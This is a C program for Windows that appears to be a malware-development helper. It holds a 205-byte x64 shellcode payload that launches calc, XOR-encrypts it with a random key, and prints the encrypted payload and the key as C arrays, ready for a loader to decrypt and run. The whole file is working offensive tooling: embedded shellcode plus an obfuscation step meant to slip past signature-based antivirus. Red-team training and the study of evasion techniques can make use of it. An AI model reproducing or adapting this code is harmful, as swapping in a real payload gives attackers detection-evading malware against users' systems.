#include "Windows.h"
#include "immintrin.h"
#include "stdio.h"

// Function to generate random N-bytes
void GenerateRandomBytes(IN DWORD n, OUT PVOID pBuf) {
	// Zero memory
	for (int i = 0; i < n; i++) {
		((PCHAR)pBuf)[i] = '\x00';
	}

	// Keep generating random 8 bytes and fit them in output buffer
	unsigned long long bytes = 0;
	DWORD nRemaining = n % 8;
	DWORD nClosest = n - nRemaining;
	for (int i = 0; i < nClosest; i += 8) {
		_rdrand64_step(&bytes);
		for (int j = 0; j < 8; j++) {
			((PCHAR)(pBuf))[i + j] = ((PCHAR)(&bytes))[j];
		}
	}

	// If there are bytes remaining that don't fit in 8 bytes blocks, do them individually in the end
	if (nClosest != n) {
		_rdrand64_step(&bytes);
		for (int i = 0; i < nRemaining; i++) {
			((PCHAR)(pBuf))[nClosest + i] = ((PCHAR)(&bytes))[i];
		}
	}
}

// Function to XOR-encrypt N-bytes (one time pad) in-place
void XorEncrypt(IN PCHAR pBuf, IN PCHAR pKey, IN DWORD pBufSize) {
	for (int i = 0; i < pBufSize; i++) {
		pBuf[i] = pBuf[i] ^ pKey[i];
	}
}

// Function to print out buffer
void PrintBuffer(IN PCHAR pBuf, IN DWORD pBufSize) {
	for (int i = 0; i < pBufSize; i++) {
		printf("\\x%02X", (unsigned char)pBuf[i]);
	}
}

void main() {
	// Payload to use (pops calc; https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm)
	unsigned char payloadToEncrypt[] =
		"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
		"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
		"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
		"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
		"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
		"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
		"\x48\x83\xec\x20\x41\xff\xd6";
	const unsigned int payloadToEncryptLen = 205;

	// Generate encryption key
	PCHAR pXorKey = VirtualAlloc(NULL, payloadToEncryptLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pXorKey == NULL) return;
	GenerateRandomBytes(payloadToEncryptLen, pXorKey);

	// Encrypt payload
	XorEncrypt(payloadToEncrypt, pXorKey, payloadToEncryptLen);

	// Print out results
	printf("const unsigned char payloadXorEncrypted[] = \"");
	PrintBuffer(payloadToEncrypt, payloadToEncryptLen);
	printf("\";\n");

	printf("const unsigned char xorDecryptionKey[] = \"");
	PrintBuffer(pXorKey, payloadToEncryptLen);
	printf("\";\n");

	printf("const unsigned int payloadAndKeyLen = %d;\n", payloadToEncryptLen);

	// Cleanup
	VirtualFree(pXorKey, 0, MEM_RELEASE);
}